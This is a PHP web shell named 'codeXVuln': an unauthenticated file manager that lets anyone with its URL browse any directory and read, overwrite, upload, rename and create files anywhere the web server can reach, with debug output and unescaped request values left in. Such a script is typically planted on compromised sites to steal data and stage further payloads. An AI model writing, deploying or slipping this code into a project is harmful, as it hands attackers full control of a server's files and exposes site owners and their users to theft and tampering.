<?php




$dir = getcwd();
$dir = explode('\\', $dir);
$dir = join("/",$dir);
print_r($dir);
if(@$_GET['dir']){
    $dir = $_GET['dir'];
}

$dirAsal = $dir;
$dirPecah = explode('/', $dirAsal);
$linkTag = '';
$link = '';
print_r($dirPecah);
for($i = 0; $i < count($dirPecah); $i++){
	if($dirPecah[$i] == "." || $dirPecah[$i] == "" || $dirPecah[$i] == null){
		unset($dirPecah[$i]);
	}else{
		$link .= "/".$dirPecah[$i];
		$linkTag .= '<a href="?dir='.$link.'">'.$dirPecah[$i].'</a>/';
	}
}
print_r($dirPecah);
$dir = join("/",$dirPecah);
unset($dirPecah[count($dirPecah)-1]);
$dirBack = join("/",$dirPecah);

// print_r($linkTag);
// print_r(@$_POST);

if(@$_POST['action']){
    if($_POST['action'] == 'setFile'){
        setFile($_POST['path'], $_POST['text']);
    }
    if($_POST['action'] == 'setRename'){
        setRename($GLOBALS['dir'], $_POST['file'], $_POST['fileNew']);
    }
    if($_POST['action'] == 'Upload'){
	
        upload();
    }
}

if(@$_GET['action']){
    if($_GET['action'] == 'newFolder'){
        createFolder($GLOBALS['dir'], 'New Folder');
    }
    if($_GET['action'] == 'newFile'){
        createFile($GLOBALS['dir'], 'NewFile.txt');
    }
}

function upload(){
	$path = $GLOBALS['dir'] .'/'. basename( $_FILES['file']['name']);
	print_r($path);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['file']['name']). 
      " has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
}

function edit($file){

    $data = file_get_contents($file);
    $new = htmlspecialchars($data, ENT_QUOTES);

    echo '<form action="?dir='.$GLOBALS['dir'].'" method="post">';
    echo '<input type="hidden" name="path" value="'.$file.'">';
    echo '<textarea rows="40" cols="100" name="text">'.$new.'</textarea>';
    echo '<input type="submit" name="action" value="setFile">';
    echo "</form>";
}

function view($file){

    $data = file_get_contents($file);
    $new = htmlspecialchars($data, ENT_QUOTES);

    echo '<textarea rows="40" cols="100" name="text">'.$new.'</textarea>';
}

function setFile($path, $text){
    file_put_contents($path, $text);
}

function setRename($path, $file, $fileNew){
	rename ($path."/".$file, $path."/".$fileNew);
}

function createFolder($path, $name){
    
    if(!is_dir($path.'/'.$name)){
        if (!mkdir($path.'/'.$name, 0777, true)) {
            die('Failed to create folders...');
        }
    }else{
        echo "Folder sudah ada<br>";
    }
    
}

function createFile($path, $name){
	file_put_contents($path.'/'.$name, '');
}

function urutDirectory($path, $array){
	$tempDir = array();
	$tempFile = array();
	asort($array);
	foreach ($array as $row) {
		$temp = $path."/".$row;
		if(is_dir($temp)){
    		array_push($tempDir, $row);
	    }else{
	    	array_push($tempFile, $row);
	    }
	    
	}
	return array_merge($tempDir, $tempFile);
}


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>codeXVuln</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <style>
    
    body{
        background-color: #252526;
        color: white;
        padding: 10px;
    }

    .my-table th, .my-table td{
        border: 1px solid white;
        border-collapse: collapse;
        padding: 7px;
    }

    .my-table tr:hover{
    	background-color: #333333;
    }

    a {
        color: white;
    }

    a:hover{
        color: yellow;
    }

    textarea{
        background-color: #1e1e1e;
    }

    input{
    	background-color: #1e1e1e;
    }

    .my-container{
        /* background-color: #333333; */
    }

    </style>

</head>
<body>

    <div class="my-container">

        <h3>codeXVuln</h3>
        <br>

        <table style="border: 0px solid white">
            <tr>
                <td>PHP version</td>
                <td>:</td>
                <td><?=phpversion()?></td>
            </tr>
            <tr>
                <td>Current Dir</td>
                <td>:</td>
                <td><?=$linkTag?></td>
            </tr>

        </table>
        <hr>
        <form action="?dir=<?=$dir?>" method="post" enctype="multipart/form-data">
	        <div class="row">
	        	<input class="col-sm-2" type="file" name="file">
	        	<input type="submit" name="action" value="Upload">
	        </div>
        </form>
        <br>
        <table style="width:100%" class="my-table">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Size</th>
                    <th>Last Modified</th>
                    <th>Owner/Group</th>
                    <th>Permission</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
            <?php 
            $dataDir = scandir($dir);
            $dataDir = urutDirectory($dir, $dataDir);
            foreach($dataDir as $entry){

            	$tempFile = $dir."/".$entry;
            ?>
                <tr>
                    <td><?=is_dir($tempFile)?" <a href='?dir=".($entry==".."?$dirBack:$tempFile)."'> <span class='glyphicon glyphicon-folder-open' style='color:#FFDD33'></span> $entry</a><br>":'<span class="glyphicon glyphicon-file" style="color:#CCCCCC"></span> '.$entry?></td>
                    <td><?=is_dir($tempFile)?'dir':'file'?></td>
                    <td><?=!is_dir($tempFile)?filesize($tempFile):''?></td>
                    <td><?=date("F d Y H:i:s.", filemtime($tempFile))?></td>
                    <td><?=fileowner($tempFile)."/".filegroup($tempFile)?></td>
                    <td><?=fileperms($tempFile)?></td>
                    <td>
                        <?php if(!is_dir($tempFile)){?>
                        <a href="?dir=<?=$dir?>&edit=<?=$tempFile?>" class="glyphicon glyphicon-edit"></a> | 
                        <a href="?dir=<?=$dir?>&view=<?=$tempFile?>" class="glyphicon glyphicon-search"></a> | 
                        <?php }else if($entry == '..' || $entry == '.'){ ?>
                        <a href="?dir=<?=$dir?>&action=newFolder" > New Folder</a> | 
                        <a href="?dir=<?=$dir?>&action=newFile" > New File</a> | 
                        <?php } 
                        if($entry != '.' && $entry != '..'){ ?>
                        <a href="?dir=<?=$dir?>&rename=<?=$entry?>"> rename</a>
                        <?php } ?>
                    </td>
                </tr>
            <?php
            }
            ?>
            </tbody>
        </table>
        <hr>
        <?php
        if(@$_GET['rename']){
        ?>
        <form method="POST" action="?dir=<?=$dir?>">
        	<input type="hidden" name="file" value="<?=$_GET['rename']?>" />
        	<input type="text" name="fileNew" value="<?=$_GET['rename']?>" />
        	<input type="submit" name="action" value="setRename" />
        	
        </form>
        <?php
        }
        if(@$_GET['edit']){

            edit($_GET['edit']);
        }
        if(@$_GET['view']){
            view($_GET['view']);
        }
        ?>
    </div>
</body>
</html>